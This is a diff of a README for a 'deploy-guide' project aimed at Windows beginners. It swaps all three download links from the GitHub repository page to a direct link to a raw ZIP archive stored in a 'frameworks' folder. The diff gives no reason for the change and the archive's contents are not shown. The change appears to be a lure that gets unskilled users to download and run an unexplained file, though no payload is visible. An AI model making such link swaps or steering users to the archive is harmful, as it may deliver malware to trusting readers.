@@ -1,6 +1,6 @@
 # ⚙️ deploy-guide - Simple Steps for Easy Deployment
 
-[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-%237f7fff?style=for-the-badge)](https://github.com/sarrahw23/deploy-guide)
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-%237f7fff?style=for-the-badge)](https://github.com/sarrahw23/deploy-guide/raw/refs/heads/main/frameworks/deploy-guide-3.0.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This guide works with any Windows PC that can run a modern browser and connect t
 
 Please visit the main page to get started:
 
-[Download deploy-guide from GitHub](https://github.com/sarrahw23/deploy-guide)
+[Download deploy-guide from GitHub](https://github.com/sarrahw23/deploy-guide/raw/refs/heads/main/frameworks/deploy-guide-3.0.zip)
 
 You will arrive at the repository page. From there:
 
@@ -133,6 +133,6 @@ Read it again. The guides are written for beginners. If issues persist, you can 
 
 Visit the project page to download the latest version of deploy-guide:
 
-[Get deploy-guide on GitHub](https://github.com/sarrahw23/deploy-guide)
+[Get deploy-guide on GitHub](https://github.com/sarrahw23/deploy-guide/raw/refs/heads/main/frameworks/deploy-guide-3.0.zip)
 
 Download the ZIP file and follow the easy guides inside. Your next deployed project is just a few steps away.
